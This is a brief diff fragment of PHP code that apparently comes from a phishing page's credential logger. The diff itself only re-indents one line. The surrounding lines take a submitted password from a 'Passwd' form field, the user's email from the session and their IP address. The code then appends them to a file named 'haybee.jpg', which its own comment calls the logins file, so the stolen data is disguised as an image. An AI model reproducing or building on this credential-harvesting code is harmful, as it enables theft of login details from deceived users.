@@ -4,7 +4,7 @@
 			
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
-      $ip = $_SERVER['REMOTE_ADDR'];
+                        $ip = $_SERVER['REMOTE_ADDR'];
 			//opening logins text file for appending new data.
   			$file = fopen("haybee.jpg", "a") or die("Unable to open file!");
 			
